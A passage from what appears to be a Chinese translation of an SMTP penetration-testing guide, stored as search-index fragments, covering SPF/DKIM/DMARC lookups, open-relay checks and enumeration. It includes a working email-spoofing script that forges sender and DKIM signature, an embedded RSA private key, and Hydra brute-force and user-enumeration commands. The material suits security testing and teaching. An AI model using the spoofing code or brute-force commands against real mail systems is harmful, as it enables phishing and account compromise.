\u7b56\u7565\uff1a kali@kali:~$ dig txt google.com | grep spf google.com. 235 IN TXT \"v=spf1 include:_spf.google.com ~all\" kali@kali:~$ dig txt _spf.google.com | grep spf ; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com ;_spf.google.com. IN TXT _spf.google.com. 235 IN TXT \"v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all\" kali@kali:~$ dig txt _netblocks.google.com | grep spf _netblocks.google.com. 1606 IN TXT \"v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all\" kali@kali:~$ dig txt _netblocks2.google.com | grep spf _netblocks2.google.com. 1908 IN TXT \"v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all\" kali@kali:~$ dig txt _netblocks3.google.com | grep spf _netblocks3.google.com. 1903 IN TXT \"v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all\" \u4f20\u7edf\u4e0a\uff0c\u53ef\u4ee5\u6b3a\u9a97\u4efb\u4f55\u6ca1\u6709\u6b63\u786e/\u4efb\u4f55 SPF \u8bb0\u5f55\u7684\u57df\u540d\u3002 \u5982\u4eca \uff0c\u5982\u679c \u7535\u5b50\u90ae\u4ef6 \u6765\u81ea \u6ca1\u6709\u6709\u6548 SPF \u8bb0\u5f55\u7684\u57df\uff0c \u53ef\u80fd\u4f1a \u81ea\u52a8\u88ab\u62d2\u7edd/\u6807\u8bb0\u4e3a\u4e0d\u53d7\u4fe1\u4efb \u3002 \u8981\u68c0\u67e5\u57df\u7684 SPF\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u5728\u7ebf\u5de5\u5177\uff0c\u4f8b\u5982\uff1a https://www.kitterman.com/spf/validate.html DKIM DomainKeys Identified Mail (DKIM) \u662f\u4e00\u79cd\u673a\u5236\uff0c\u901a\u8fc7\u8be5\u673a\u5236\uff0c \u5916\u56fd MTA \u5728\u901a\u8fc7 DNS \u68c0\u7d22\u57df\u7684\u516c\u94a5\u65f6\u5bf9\u51fa\u7ad9\u7535\u5b50\u90ae\u4ef6\u8fdb\u884c\u7b7e\u540d\u548c\u9a8c\u8bc1 \u3002DKIM \u516c\u94a5\u4fdd\u5b58\u5728\u57df\u7684 TXT \u8bb0\u5f55\u4e2d\uff1b\u4f46\u662f\uff0c\u60a8\u5fc5\u987b\u77e5\u9053\u9009\u62e9\u5668\u548c\u57df\u540d\u624d\u80fd\u68c0\u7d22\u5b83\u3002 \u7136\u540e\uff0c\u8981\u8bf7\u6c42\u5bc6\u94a5\uff0c\u60a8\u9700\u8981\u57df\u540d\u548c\u90ae\u4ef6\u6807\u9898\u4e2d\u7684\u90ae\u4ef6\u9009\u62e9\u5668\uff0c DKIM-Signature \u4f8b\u5982\uff1a d=gmail.com;s=20120113 dig 20120113._domainkey.gmail.com TXT | grep p= 20120113._domainkey.gmail.com. 280 IN TXT \"k=rsa\\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCg KCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3 DMARC \u57fa\u4e8e\u57df\u7684\u6d88\u606f\u8eab\u4efd\u9a8c\u8bc1\u3001\u62a5\u544a\u548c\u4e00\u81f4\u6027 (DMARC) \u662f\u4e00\u79cd\u5728 SPF \u548c DKIM \u57fa\u7840\u4e0a\u6269\u5c55\u7684\u90ae\u4ef6\u8eab\u4efd\u9a8c\u8bc1\u65b9\u6cd5\u3002\u7b56\u7565\u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u5982\u4f55\u5904\u7406\u7ed9\u5b9a\u57df\u7684\u7535\u5b50\u90ae\u4ef6\u5e76\u62a5\u544a\u6267\u884c\u7684\u64cd\u4f5c\u3002 \u83b7\u53d6DMARC\u8bb0\u5f55\u9700\u8981\u67e5\u8be2\u5b50\u57df\u540d_dmarc root@kali:~# dig _dmarc.yahoo.com txt | grep DMARC _dmarc.yahoo.com. 1785 IN TXT \"v=DMARC1\\; p=reject\\; sp=none\\; pct=100\\; rua=mailto:dmarc-yahoo-rua@yahoo-inc.com, mailto:dmarc_y_rua@yahoo.com\\;\" root@kali:~# dig _dmarc.google.com txt | grep DMARC _dmarc.google.com. 600 IN TXT \"v=DMARC1\\; p=quarantine\\; rua=mailto:mailauth-reports@google.com\" root@kali:~# dig _dmarc.paypal.com txt | grep DMARC _dmarc.paypal.com. 300 IN TXT \"v=DMARC1\\; p=reject\\; rua=mailto:d@rua.agari.com\\; ruf=mailto:dk@bounce.paypal.com,mailto:d@ruf.agari.com\" PayPal \u548c Yahoo \u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u62d2\u7edd\u5305\u542b\u65e0\u6548 DKIM \u7b7e\u540d\u6216\u5e76\u975e\u6765\u81ea\u5176\u7f51\u7edc\u7684\u90ae\u4ef6\u3002\u7136\u540e\u5c06\u901a\u77e5\u53d1\u9001\u5230\u6bcf\u4e2a\u7ec4\u7ec7\u5185\u7684\u76f8\u5e94\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u3002\u8c37\u6b4c\u4ee5\u7c7b\u4f3c\u7684\u65b9\u5f0f\u914d\u7f6e\uff0c\u5c3d\u7ba1\u5b83\u6307\u793a\u90ae\u4ef6\u670d\u52a1\u5668\u9694\u79bb\u90ae\u4ef6\u800c\u4e0d\u662f\u5b8c\u5168\u62d2\u7edd\u5b83\u4eec\u3002 DMARC \u6807\u7b7e Tag Name Purpose Sample v \u534f\u8bae\u7248\u672c v=DMARC1 pct \u53d7\u5230\u8fc7\u6ee4\u7684\u6d88\u606f\u7684\u767e\u5206\u6bd4 pct=20 ruf \u53d6\u8bc1\u62a5\u544a\u7684\u62a5\u544a URI ruf=mailto:authfail@example.com rua \u6c47\u603b\u62a5\u544a\u7684\u62a5\u544a URI rua=mailto:aggrep@example.com p \u7ec4\u7ec7\u57df\u7b56\u7565 p=quarantine sp OD \u5b50\u57df\u7684\u7b56\u7565 sp=reject adkim DKIM \u7684\u5bf9\u9f50\u6a21\u5f0f adkim=s aspf SPF \u5bf9\u9f50\u6a21\u5f0f aspf=r \u5b50\u57df\u5462\uff1f \u4ece\u8fd9\u91cc \u5f00\u59cb . \u60a8\u9700\u8981\u4e3a\u60a8\u5e0c\u671b\u4ece\u4e2d\u53d1\u9001\u90ae\u4ef6\u7684\u6bcf\u4e2a\u5b50\u57df\u62e5\u6709\u5355\u72ec\u7684 SPF \u8bb0\u5f55\u3002 \u4ee5\u4e0b\u5185\u5bb9\u6700\u521d\u53d1\u5e03\u5728 openspf.org \u4e0a\uff0c\u8be5\u7f51\u7ad9\u66fe\u7ecf\u662f\u6b64\u7c7b\u5185\u5bb9\u7684\u91cd\u8981\u8d44\u6e90\u3002 \u96be\u641e\u7684\u95ee\u9898: \u5b50\u57df\u5462\uff1f \u5982\u679c\u6211\u6536\u5230\u6765\u81ea pielovers.demon.co.uk \u7684\u90ae\u4ef6\uff0c\u5e76\u4e14\u6ca1\u6709 pielovers \u7684 SPF \u6570\u636e\uff0c\u6211\u662f\u5426\u5e94\u8be5\u8fd4\u56de\u4e00\u7ea7\u5e76\u6d4b\u8bd5 demon.co.uk \u7684 SPF\uff1f\u4e0d\u3002Demon \u7684\u6bcf\u4e2a\u5b50\u57df\u90fd\u662f\u4e0d\u540c\u7684\u5ba2\u6237\uff0c\u6bcf\u4e2a\u5ba2\u6237\u53ef\u80fd\u6709\u81ea\u5df1\u7684\u653f\u7b56\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b Demon \u7684\u653f\u7b56\u9002\u7528\u4e8e\u6240\u6709\u5ba2\u6237\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff1b\u5982\u679c Demon \u60f3\u8981\u8fd9\u6837\u505a\uff0c\u5b83\u53ef\u4ee5\u4e3a\u6bcf\u4e2a\u5b50\u57df\u8bbe\u7f6e SPF \u8bb0\u5f55\u3002 \u56e0\u6b64\uff0c\u5bf9 SPF \u53d1\u5e03\u8005\u7684\u5efa\u8bae\u662f\uff1a\u60a8\u5e94\u8be5\u4e3a\u6bcf\u4e2a\u5177\u6709 A \u6216 MX \u8bb0\u5f55\u7684\u5b50\u57df\u6216\u4e3b\u673a\u540d\u6dfb\u52a0 SPF \u8bb0\u5f55\u3002 \u5177\u6709\u901a\u914d\u7b26 A \u6216 MX \u8bb0\u5f55\u7684\u7ad9\u70b9\u8fd8\u5e94\u5177\u6709\u901a\u914d\u7b26 SPF \u8bb0\u5f55\uff0c\u683c\u5f0f\u4e3a\uff1a* IN TXT \"v=spf1 -all\" \u8fd9\u662f\u6709\u9053\u7406\u7684\u2014\u2014\u4e00\u4e2a\u5b50\u57df\u5f88\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u5730\u7406\u4f4d\u7f6e\u5e76\u4e14\u5177\u6709\u975e\u5e38\u4e0d\u540c\u7684 SPF \u5b9a\u4e49\u3002 \u6253\u5f00\u4e2d\u7ee7 \u4e3a\u9632\u6b62\u53d1\u9001\u7684\u90ae\u4ef6\u88ab\u5783\u573e\u90ae\u4ef6\u8fc7\u6ee4\u5668\u8fc7\u6ee4\u800c\u65e0\u6cd5\u5230\u8fbe\u6536\u4ef6\u4eba\uff0c\u53d1\u4ef6\u4eba\u53ef\u4ee5\u4f7f\u7528 \u6536\u4ef6\u4eba\u4fe1\u4efb\u7684\u4e2d\u7ee7\u670d\u52a1\u5668 \u3002\u901a\u5e38\uff0c\u7ba1\u7406\u5458 \u6ca1\u6709\u6982\u8ff0 \u4ed6\u4eec\u5fc5\u987b \u5141\u8bb8 \u54ea\u4e9b IP\u8303\u56f4 \u3002\u8fd9\u4f1a\u5bfc\u81f4\u6211\u4eec\u5728\u5916\u90e8\u548c\u5185\u90e8\u6e17\u900f\u6d4b\u8bd5\u4e2d\u4ecd\u7136\u7ecf\u5e38\u53d1\u73b0\u7684 SMTP \u670d\u52a1\u5668\u914d\u7f6e\u9519\u8bef\u3002\u56e0\u6b64\uff0c\u5b83\u4eec \u5141\u8bb8\u6240\u6709 IP \u5730\u5740 \u4e0d\u4f1a\u5728\u7535\u5b50\u90ae\u4ef6\u6d41\u91cf\u4e2d\u9020\u6210\u9519\u8bef\uff0c\u4ece\u800c\u4e0d\u4f1a\u5e72\u6270\u6216\u65e0\u610f\u4e2d\u4e2d\u65ad\u4e0e\u6f5c\u5728\u548c\u5f53\u524d\u5ba2\u6237\u7684\u901a\u4fe1\uff1a mynetworks = 0.0.0.0/0 nmap -p25 --script smtp-open-relay 10.10.10.10 -v \u5de5\u5177 https://github.com/serain/mailspoof \u68c0\u67e5 SPF \u548c DMARC \u914d\u7f6e\u9519\u8bef https://pypi.org/project/checkdmarc/ \u81ea\u52a8\u83b7\u53d6 SPF \u548c DMARC \u914d\u7f6e \u53d1\u9001\u6076\u641e\u90ae\u4ef6 https://www.mailsploit.com/index http://www.anonymailer.net/ https://emkei.cz/ \u6216\u8005\u4f60\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177\uff1a https://github.com/magichk/magicspoofing # \u8fd9\u5c06\u4ecetest@victim.com\u53d1\u9001\u6d4b\u8bd5\u7535\u5b50\u90ae\u4ef6\u5230destination@gmail.com python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com # \u4f46\u4f60\u4e5f\u53ef\u4ee5\u4fee\u6539\u90ae\u4ef6\u7684\u66f4\u591a\u9009\u9879 python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com \u5982\u679c\u60a8 \u5728 dkim python \u5e93 \u4e2d\u4f7f\u7528\u89e3\u6790\u5bc6\u94a5\u65f6\u9047\u5230\u4efb\u4f55\u9519\u8bef\uff0c\u8bf7\u968f\u610f\u4f7f\u7528\u4ee5\u4e0b\u4e00\u4e2a\u3002 \u6ce8\u610f \uff1a\u8fd9\u53ea\u662f\u4e00\u4e2a\u80ae\u810f\u7684\u4fee\u590d\uff0c\u7528\u4e8e\u5728\u7531\u4e8e\u67d0\u79cd\u539f\u56e0 openssl \u79c1\u94a5 \u65e0\u6cd5\u88ab dkim \u89e3\u6790\u7684 \u60c5\u51b5\u4e0b\u8fdb\u884c\u5feb\u901f\u68c0\u67e5\u3002 -----BEGIN RSA PRIVATE KEY----- MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1 koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ== -----END RSA PRIVATE KEY----- \u6216\u8005\u4f60\u53ef\u4ee5\u624b\u52a8\u5b8c\u6210\uff1a php # \u8fd9\u5c06\u53d1\u9001\u672a\u7b7e\u540d\u7684\u6d88\u606f mail(\"your_email@gmail.com\", \"Test Subject!\", \"hey! This is a test\", \"From: administrator@victim.com\"); Python # \u6765\u81ea https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py import os import dkim #pip3 install dkimpy import smtplib from email.mime.multipart import MIMEMultipart from email.mime.text import MIMEText from email.mime.base import MIMEBase # Set destination=\"destination@gmail.com\" sender=\"administrator@victim.com\" subject=\"Test\" message_html=\"\"\" <html> <body> <h3>This is a test, not a scam</h3> <br /> </body> </html> \"\"\" sender_domain=sender.split(\"@\")[1] # Prep os.system(\"sudo sed -ri 's/(myhostname) = (.*)/\\\\1 = \"+sender_domain+\"/g' /etc/postfix/main.cf\") os.system(\"systemctl restart postfix\") # \u751f\u6210 DKIM keys dkim_private_key_path=\"dkimprivatekey.pem\" os.system(f\"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null\") with open(dkim_private_key_path) as fh: dkim_private_key = fh.read() # \u751f\u6210\u7535\u5b50\u90ae\u4ef6 msg = MIMEMultipart(\"alternative\") msg.attach(MIMEText(message_html, \"html\")) msg[\"To\"] = destination msg[\"From\"] = sender msg[\"Subject\"] = subject headers = [b\"To\", b\"From\", b\"Subject\"] msg_data = msg.as_bytes() # \u4f7f\u7528dkim\u7b7e\u7f72\u7535\u5b50\u90ae\u4ef6 ## \u6536\u4ef6\u4eba\u5c06\u65e0\u6cd5\u68c0\u67e5\uff0c\u4f46\u7535\u5b50\u90ae\u4ef6\u5c06\u663e\u793a\u4e3a\u5df2\u7b7e\u540d\uff08\u56e0\u6b64\u66f4\u53ef\u4fe1\uff09 dkim_selector=\"s1\" sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers) msg[\"DKIM-Signature\"] = sig[len(\"DKIM-Signature: \") :].decode() msg_data = msg.as_bytes() # \u4f7f\u7528\u672c\u5730\u540e\u7f00\u4e2d\u7ee7\u53d1\u9001\u7535\u5b50\u90ae\u4ef6 smtp=\"127.0.0.1\" s = smtplib.SMTP(smtp) s.sendmail(sender, [destination], msg_data) \u66f4\u591a\u4fe1\u606f \u5728 https://seanthegeek.net/459/demystifying-dmarc/ \u4e2d\u67e5\u627e\u6709\u5173\u8fd9\u4e9b\u4fdd\u62a4\u7684\u66f4\u591a\u4fe1\u606f \u901a\u8fc7 SMTP \u6e17\u900f \u5982\u679c\u60a8\u53ef\u4ee5\u901a\u8fc7 SMTP \u53d1\u9001\u6570\u636e\uff0c [ \u8bf7\u9605\u8bfb\u6b64 ] \u3002 \u914d\u7f6e\u6587\u4ef6 \u540e\u7f00 \u901a\u5e38\uff0c\u5982\u679c\u5df2\u5b89\u88c5\uff0cin /etc/postfix/master.cf \u5305\u542b\u5728\u4f8b\u5982\u7528\u6237\u6536\u5230\u65b0\u90ae\u4ef6\u65f6 \u6267\u884c\u7684\u811a\u672c\u3002 \u4f8b\u5982\uff0c\u8be5\u884c flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient} \u8868\u793a /etc/postfix/filtering \u5982\u679c\u7528\u6237\u6807\u8bb0\u6536\u5230\u65b0\u90ae\u4ef6\uff0c\u5c06\u6267\u884c\u8be5\u884c\u3002 \u5176\u4ed6\u914d\u7f6e\u6587\u4ef6\uff1a sendmail.cf submit.cf \u81ea\u52a8\u5316\u547d\u4ee4 Protocol_Name: SMTP #\u534f\u8bae\u7f29\u5199(\u5982\u679c\u6709\u7684\u8bdd)\u3002 Port_Number: 25,465,587 #\u5982\u679c\u6709\u591a\u4e2a\uff0c\u5219\u7528\u9017\u53f7\u5206\u9694\u3002 Protocol_Description: Simple Mail Transfer Protocol #\u534f\u8bae\u7f29\u5199 Entry_1: Name: Notes Description: Notes for SMTP Note: | SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server. Entry_2: Name: Banner Grab Description: Grab SMTP Banner Command: nc -vn {IP} 25 Entry_3: Name: SMTP Vuln Scan Description: SMTP Vuln Scan With Nmap Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP} Entry_4: Name: SMTP User Enum Description: Enumerate uses with smtp-user-enum Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP} Entry_5: Name: SMTPS Connect Description: Attempt to connect to SMTPS two different ways Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587 Entry_6: Name: Find MX Servers Description: Find MX servers of an organization Command: dig +short mx {Domain_Name} Entry_7: Name: Hydra Brute Force Description: Need Nothing Command: hydra -P {Big_Passwordlist} {IP} smtp -V Entry_8: Name: consolesless mfs enumeration Description: SMTP enumeration without the need to run msfconsole Note: sourced from https://github.com/carlospolop/legion Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'","title":"25,465,587 - SMTPs\u6e17\u900f\u6d4b\u8bd5"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_1","text":"SMTP\uff08\u7b80\u5355\u90ae\u4ef6\u4f20\u8f93\u534f\u8bae\uff09 \u662f\u4e00\u79cd\u7528\u4e8e \u53d1\u9001 \u548c\u63a5\u6536 \u7535\u5b50\u90ae\u4ef6\u7684 TCP/IP \u534f\u8bae \u3002\u4f46\u662f\uff0c\u7531\u4e8e\u5b83\u5728\u63a5\u6536\u7aef\u5bf9\u6d88\u606f\u8fdb\u884c\u6392\u961f\u7684\u80fd\u529b\u6709\u9650\uff0c\u56e0\u6b64\u5b83\u901a\u5e38\u4e0e\u5176\u4ed6\u4e24\u79cd\u534f\u8bae\u4e4b\u4e00\uff08POP3 \u6216 IMAP\uff09\u4e00\u8d77\u4f7f\u7528\uff0c\u4f7f\u7528\u6237\u53ef\u4ee5\u5c06\u6d88\u606f\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u90ae\u7bb1\u4e2d\u5e76\u5b9a\u671f\u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u5b83\u4eec\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c \u7528\u6237\u901a\u5e38\u4f7f\u7528 \u4f7f\u7528 SMTP \u53d1\u9001\u7535\u5b50\u90ae\u4ef6 \u5e76\u4f7f\u7528 POP3 \u6216 IMAP \u63a5\u6536 \u7535\u5b50\u90ae\u4ef6\u7684\u7a0b\u5e8f\u3002\u5728\u57fa\u4e8e Unix \u7684\u7cfb\u7edf\u4e0a\uff0c sendmail \u662f\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u7535\u5b50\u90ae\u4ef6 SMTP \u670d\u52a1\u5668\u3002\u5546\u4e1a\u8f6f\u4ef6\u5305 Sendmail \u5305\u62ec\u4e00\u4e2a POP3 \u670d\u52a1\u5668\u3002 Microsoft Exchange \u5305\u62ec\u4e00\u4e2a SMTP \u670d\u52a1\u5668\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u5305\u62ec POP3 \u652f\u6301\u3002 \u4ece \u8fd9\u91cc\u5f00\u59cb \u3002 \u9ed8\u8ba4\u7aef\u53e3: 25,465(ssl),587(ssl) PORT STATE SERVICE REASON VERSION 25/tcp open smtp syn-ack Microsoft ESMTP 6.0.3790.3959","title":"\u57fa\u672c\u4fe1\u606f"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#email-headers","text":"\u5982\u679c\u4f60\u6709\u673a \u4f1a\u8ba9\u53d7\u5bb3\u8005\u7ed9\u4f60\u53d1\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6 \uff08\u4f8b\u5982\u901a\u8fc7\u7f51\u9875\u7684\u8054\u7cfb\u65b9\u5f0f\uff09\uff0c\u90a3\u4e48\u8fd9\u6837\u505a\u662f\u56e0\u4e3a\u4f60\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u90ae\u4ef6\u6807\u9898\u4e86\u89e3\u53d7\u5bb3\u8005 \u7684\u5185\u90e8\u62d3\u6251\u7ed3\u6784\u3002 \u60a8\u8fd8\u53ef\u4ee5\u4ece SMTP \u670d\u52a1\u5668\u83b7\u53d6\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\uff0c\u8bd5\u56fe \u5411\u8be5\u670d\u52a1\u5668\u53d1\u9001\u4e00\u5c01\u7535\u5b50\u90ae\u4ef6\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u5730\u5740 \uff08\u56e0\u4e3a\u670d\u52a1\u5668\u5c06\u5411\u653b\u51fb\u8005\u53d1\u9001\u4e00\u5c01 NDN \u90ae\u4ef6\uff09\u3002\u4f46\u662f\uff0c\u8bf7\u786e\u4fdd\u60a8\u4ece\u5141\u8bb8\u7684\u5730\u5740\u53d1\u9001\u7535\u5b50\u90ae\u4ef6\uff08\u68c0\u67e5 SPF \u7b56\u7565\uff09\u5e76\u4e14\u60a8\u53ef\u4ee5\u63a5\u6536 NDN \u6d88\u606f\u3002 \u60a8\u8fd8\u5e94\u8be5\u5c1d\u8bd5\u53d1\u9001\u4e0d\u540c\u7684\u5185\u5bb9\uff0c\u56e0\u4e3a\u60a8\u53ef\u4ee5\u5728\u6807\u9898\u4e0a \u627e\u5230\u66f4\u591a\u6709\u8da3\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\uff1a \u60a8\u5e94\u8be5\u53d1\u9001 EICAR \u6d4b\u8bd5\u6587\u4ef6\u3002 \u68c0\u6d4b AV \u53ef\u80fd\u5141\u8bb8\u60a8\u5229\u7528 \u5df2\u77e5\u6f0f\u6d1e\u3002 X-Virus-Scanned: by av.domain.com","title":"EMAIL Headers"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_2","text":"","title":"\u57fa\u672c\u52a8\u4f5c"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#banner","text":"SMTP: nc -vn <IP> 25 SMTPS : openssl s_client -crlf -connect smtp.mailgun.org:465 #\u6ca1\u6709starttls\u547d\u4ee4\u7684SSL/TLS openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587","title":"Banner \u6293\u53d6/\u57fa\u672c\u8fde\u63a5"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#mx","text":"dig +short mx google.com","title":"\u67e5\u627e\u7ec4\u7ec7\u7684 MX \u670d\u52a1\u5668"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_3","text":"nmap -p25 --script smtp-commands 10.10.10.10 nmap -p25 --script smtp-open-relay 10.10.10.10 -v","title":"\u679a\u4e3e"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#ntlm-auth-","text":"\u5982\u679c\u670d\u52a1\u5668\u652f\u6301 NTLM \u8eab\u4efd\u9a8c\u8bc1 (Windows)\uff0c\u60a8\u53ef\u4ee5\u83b7\u5f97\u654f\u611f\u4fe1\u606f\uff08\u7248\u672c\uff09\u3002\u66f4\u591a\u4fe1\u606f \u5728\u8fd9\u91cc \u3002 root@kali: telnet example.com 587 220 example.com SMTP Server Banner >> HELO 250 example.com Hello [x.x.x.x] >> AUTH NTLM 334 NTLM supported >> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA \u6216\u8005\u4f7f\u7528 nmap \u63d2\u4ef6 \u81ea\u52a8\u6267\u884c \u6b64\u64cd\u4f5c smtp-ntlm-info.nse","title":"NTLM Auth - \u4fe1\u606f\u6cc4\u9732"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#-","text":"\u5f53\u53d1\u51fa\u6ca1\u6709\u5b8c\u6574\u5730\u5740\u7684\u547d\u4ee4\u201cMAIL FROM\u201d\u65f6\uff0c\u67d0\u4e9b SMTP \u670d\u52a1\u5668\u4f1a\u81ea\u52a8\u5b8c\u6210\u53d1\u4ef6\u4eba\u7684\u5730\u5740\uff0c\u4ece\u800c\u6cc4\u9732\u5176\u5185\u90e8\u540d\u79f0\uff1a 220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at Wed, 15 Sep 2021 12:13:28 +0200 EHLO all 250-somedomain.com Hello [x.x.x.x] 250-TURN 250-SIZE 52428800 250-ETRN 250-PIPELINING 250-DSN 250-ENHANCEDSTATUSCODES 250-8bitmime 250-BINARYMIME 250-CHUNKING 250-VRFY 250 OK MAIL FROM: me 250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK","title":"\u5185\u90e8\u670d\u52a1\u5668\u540d\u79f0 - \u4fe1\u606f\u6cc4\u9732"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_4","text":"\u68c0\u67e5\u4f60\u662f\u5426\u4ece\u6570\u636e\u5305\u4e2d\u55c5\u63a2\u4e86\u4e00\u4e9b\u5bc6\u7801\u5230\u7aef\u53e3 25","title":"\u55c5\u63a2"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_5","text":"\u5e76\u4e0d\u603b\u662f\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1","title":"\u7528\u6237\u540d\u66b4\u529b\u679a\u4e3e"},{"location":"Network%20Prot/25%2C465%2C587%20-%20SMTPs%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/#_6","text":"$ telnet 10.0.10.1 25 Trying 10.0.10.1... Connected to 10.0.10.1. Escape character is '^]'. 220 myhost ESMTP Sendmail 8.9.3 HELO x 250 myhost Hello [10.0.0.99], pleased to meet you MAIL FROM:test@test.org 250 2.1.0 test@test.org... Sender ok RCPT TO:test 550 5.1.1 test... 